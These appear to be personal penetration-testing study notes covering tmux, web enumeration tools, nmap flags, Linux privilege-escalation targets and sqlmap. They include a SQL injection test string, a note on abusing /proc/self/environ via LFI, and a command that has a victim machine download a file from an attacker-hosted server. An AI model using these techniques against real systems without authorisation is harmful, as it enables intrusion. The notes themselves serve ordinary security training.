---
layout: default
title: "Sessions 1 & 2"  # What shows in the sidebar
parent: "Sessions" # e.g., Enumeration
nav_order: 2           # Position in the list
---

# Sessions 1 & 2 Notes

## TMUX

- Terminal Multiplexor
- Allows multiple terminals to run inside a terminal!

**Layers:**

1. **Session**: Entire workspace we work on, can detach and reattach at any time!
2. **Window**: Each session can have multiple windows, similar to browser tabs
3. **Panes**: Split the window into pieces that show at the same time!

**Commands**:

- Start TMUX Session: `tmux`
    - Start TMUX Session w/ label: `tmux new -s (label)`
- Hotkey: `Ctrl-b`
- Detach TMUX Session: `d`
    - simply disconnects from shell, but does not delete it or stop the session from running, as it continues on!
- Reattach to most recent session: `tmux a`
    - Reattach to specific session w/ label: `tmux a -t "label"`
- List tmux sessions: `tmux ls`
- Kill tmux session: `tmux kill-session -t (label)`
- Kill ALL tmux sessions: `tmux kill-server`
- Rename Session: `C-b $`
- Create Pane
    - Vertical - `C-b %`
    - Horizontal - `C-b "`
- Move Pane: `C-b [Arrows]`
    - OR: `C-b q [index]`
- Resize Pane: `C-b Ctrl/Alt [Arrows]`
- Create Window: `C-b c`
- Move Windows
    - Move Windows & Sessions: `C-b w`
    - Move to next window: `C-b n`
- Rename Window: `C-b ,`
- Delete Pane: When highlighted over pane, `C-b x`
    - or use `exit` command
- Delete window: `C-b &`

**Copy Mode Cmds:**

- Enter Copy Mode: `C-b [`
    - From here, we can navigate around the terminal with vim commands, and highlight text. Hit `Enter` Button to copy, then `C-b ]` to paste!
- Hold `Shift` Button to ignore copy mode

**Other:** 

- to set an environment variable in tmux session
    - Do `C-b :` then `set-environment (var) (val)`

---

## Directory Enumeration

- finding hidden paths on web server using brute force on wordlist

**Command**: `feroxbuster -u http://(IP) -w (wordlist) | tee directories.txt`

- web wordlist @ `/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt`
- tee = shows results live in terminal, and also saves to file!

---

## Website Fingerprinting/Enumeration

### Wappalyzer/Whatweb

- shows info about technology stack of website, can show vulnerable apps.
- We can use the CLI alternative, whatweb

Command: `whatweb http://(IP)`

- use `-v` for verbose
- use `-a 3` or `-a 4` for more aggression

---

## Web Server Scanner

### Nikto

- looks for vulnerabilities and misconfigurations in web server

Command: `nikto -h http://(IP)`

---

## Interesting Linux Files

1. `/snap/bin/lxc` = LXC (Linux Container), container tech. in Linux
2. `/etc/fstab` = config file to mount partitions and storage device, maps to directories
3. `/etc/ssh/sshd_config` = config file for SSH Daemon
    1. contains `PermitRootLogin` directive, allows anyone to try SSH as root
    2. check w/ low-privilege shell, see if we can edit it for potential privilege escalation
4. `/proc/self/environ` = stores environment variables of current process
    1. LFI attack target! attacker can send malicious http code, which stores in environment variable, which can then be executed
5. `/var/log/auth.log` = security log of system
    1. relates to `adm` group. this group has privileged access to log files, with this access, check prev. file and `/var/log/syslog`

---

## NMAP Vulnerability Scan (START W/ THIS)

Command: `nmap -A -v --min-rate=1000 -oN nmap_scan.txt (IP)`

- `-A` = aggressive scan
    - OS + version detection, default scripts
    - `-sV` + `-sC` + `-O`
- `-oN` = output to txt
- `-v` = verbose, nmap tells results during scan

### Other Flags!

- `-p-` = scan all ports, in TCP
- `-Pn` = no ping, use for windows targets w/ firewall
    - bypasses ICMP blocks
- `-sU` = UDP Scan

- `-sC` = run NSE scripts
- `-sV` = determine service/version info about ports
- `-sS` = stealth scan

---

## SQL Injection

- when data gets misinterpreted as command, leaking sql database info out

example test: `admin' OR '1'='1`

We can automate this with **sqlmap**

1. Open Burp Suite, Intercept the request we want to test (ex: failed login attempt)
2. Right-click request, copy text to file
3. Execute sqlmap, using -r parameter as follows:

`sqlmap -r request.txt --batch --dbs`

- `--batch` = auto answers yes to prompts
- `--dbs` = enumerates databases on vulnerable server
- `--level` = can scale amount of parameters/injections tested
    - `--level=1` to `--level=5`

---

## Local File Inclusion

sudo -l

service:

- setuid/setgid
- cron jobs

---

## Uploading File from Local Attack  Machine to Victim

### Method 1

start python server wherever file is located

`python -m http.server 80`

On victim machine, download file as follows

`wget http://(remote IP)/(file)`

- use ifconfig to find IP

## Other

`w`  = command which shows current logged-in users + info:

- what they are doing
- where they are from
- etc.

`/mnt/hgfs` = mount point used by vmware for shared folders

`export` = use to temporarily create variables in terminal session

- ex: if the DC ip we have for now is 10.200.70.101, use command like
    - `export DC=10.200.70.101`
- then we can use this IP using $DC

Opened files by processes in 

Sockets

D-bus

pkexec old version exploitation ? w/ suid bit 

adm group for logs

look for unknown suid binaries

setuid = binary always executed with permission of owner
